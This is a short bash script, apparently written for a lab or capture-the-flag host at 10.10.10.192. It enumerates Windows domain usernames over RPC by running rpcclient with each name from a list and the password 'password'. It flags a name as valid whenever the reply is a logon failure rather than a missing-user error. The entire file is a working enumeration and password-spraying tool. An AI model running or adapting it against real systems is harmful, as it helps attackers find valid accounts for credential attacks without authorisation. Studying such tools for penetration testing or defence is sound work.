#!/bin/bash
# author: dead1
# rpc-spray-enum.sh
# rpc user enumeration
# enumerate users from a list file against target host rpc

# username file
userfile=users.txt
host=10.10.10.192

count=`wc -w ${userfile} | cut -d " " -f 1`
i=$((0))

echo -e "[*] Dead1's RPC User Enumerator"
echo -e "[*] Target Host:	${host}"
echo -e "[*] Total Usernames:	${count}\n"

for u in `cat ${userfile}`;
do
	echo -ne "[*] Trying User: $u\r"
	string=`rpcclient -U "$u%password" ${host} | grep -i "NT_STATUS_LOGON_FAILURE"`
	if [[ $string == *"LOGON_FAILURE"* ]]; then
  		echo -e "\n[*] VALID USERNAME FOUND:	${u}\n"
		i=$((i+1))
	fi
	echo -ne "\r"
done
echo -e "\n"
echo -e "[*] Done. Found ${i} Valid Usernames."
